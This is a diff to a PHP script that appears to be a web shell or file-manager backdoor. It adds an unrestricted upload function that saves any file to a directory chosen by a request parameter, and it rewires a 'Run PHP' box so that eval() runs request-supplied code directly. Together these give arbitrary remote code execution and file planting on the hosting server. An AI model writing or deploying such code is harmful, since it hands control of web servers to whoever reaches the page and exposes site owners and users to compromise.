@@ -99,6 +99,25 @@ function downloadFile($file) {
 	die;
 }
 
+function uploadFile($outdir) {
+	if($_FILES['upFile'] === NULL) {
+		echo '<form method="post" enctype="multipart/form-data">
+<input id="upFile" name="upFile" type="file"><br />
+<input type="submit" value="Upload" style="font-weight: bold">
+<input type="button" value="Cancel" onclick="browseDir(\''.addslashes($outdir).'\');" />
+</form>
+';
+	} else {
+		$outdir .= '/';
+		if(move_uploaded_file($_FILES['upFile']['tmp_name'],
+		   $outdir . $_FILES['upFile']['name'])) {
+			echo "Successfully uploaded. <a href=\"javascript:browseDir('".addslashes($outdir)."');\">Return</a>";
+		} else {
+			echo 'Upload failed. <a href="javascript:history.go(-1)">Retry</a>';
+		}
+	}
+}
+
 function editFile($filename, $new) {
 	global $thisDir;
 	
@@ -145,8 +164,8 @@ function deleteSubject($subject) {
 	die;
 }
 
-function evalBox() {
-	if ($_POST['v'] === NULL) {
+function evalBox($command) {
+	if ($command === false) {
 		echo '
 <h2>Run PHP</h2>
 <form action="javascript://" onsubmit="execEval()">
@@ -158,7 +177,7 @@ function evalBox() {
 	}
 	else {
 		ob_clean();
-		eval(gpc($_POST['v']));
+		eval($command);
 		die;
 	}
 }
@@ -381,7 +400,10 @@ switch ($action) {
 		saveFile($subject, $value);
 		break;
 	case 'eval':
-		evalBox();
+		evalBox($value);
+		break;
+	case 'ul':
+		uploadFile($subject);
 		break;
 	case 'dir':
 		printDir($subject);
